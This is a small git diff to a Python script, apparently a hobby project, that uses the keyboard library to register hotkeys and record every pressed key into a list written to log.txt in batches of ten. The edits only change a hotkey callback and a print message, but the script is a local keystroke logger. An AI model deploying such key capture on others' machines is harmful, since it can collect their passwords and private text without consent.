@@ -4,7 +4,7 @@ keys = [] #initializes the list of 10 keys to send to log.txt when limit is reac
 
 def hotkey2(): #unique function for hotkey
     print("ctrl + shift + z was pressed")
-keyboard.add_hotkey('ctrl + shift + z', lambda: print("ctrl + shift + z was Pressed!")) #creates hotkey1 when shift+ctrl+z is pressed
+keyboard.add_hotkey('ctrl + shift + z', hotkey2) #creates hotkey1 when shift+ctrl+z is pressed
 
 def hotkey1():#second unique function for hotkey
     print("Space was pressed")
@@ -13,7 +13,7 @@ keyboard.add_hotkey('space', hotkey1) #creates hotkey2 when shift+s is pressed
 def key_pressed(event): #creates event handler function when key is pressed
     key = (event.name) #creates a key object for each key pressed
     file = open("log.txt", "a") #opens text file in append mode
-    print(key) #standard print call for key pressed
+    print("Key pressed: " + key) #standard print call for key pressed
     keys.append(event.name) #appends to growing list
 
     if len(keys) == 10: #when list is 10 the loop will write to the file log.txt
